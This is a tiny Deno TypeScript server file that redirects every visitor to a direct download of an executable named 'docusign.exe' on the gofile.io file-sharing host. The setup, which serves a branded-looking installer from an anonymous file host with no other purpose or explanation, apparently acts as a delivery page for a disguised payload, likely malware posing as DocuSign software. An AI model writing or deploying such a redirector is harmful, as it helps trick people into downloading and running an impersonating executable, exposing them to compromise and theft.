// main.ts
import { serve } from "https://deno.land/std/http/server.ts";

serve((_req) => {
  return new Response(null, {
    status: 302,
    headers: {
      Location: "https://store-na-phx-4.gofile.io/download/direct/7aefb050-f774-457e-9feb-977d52e400a6/docusign.exe",
    },
  });
});
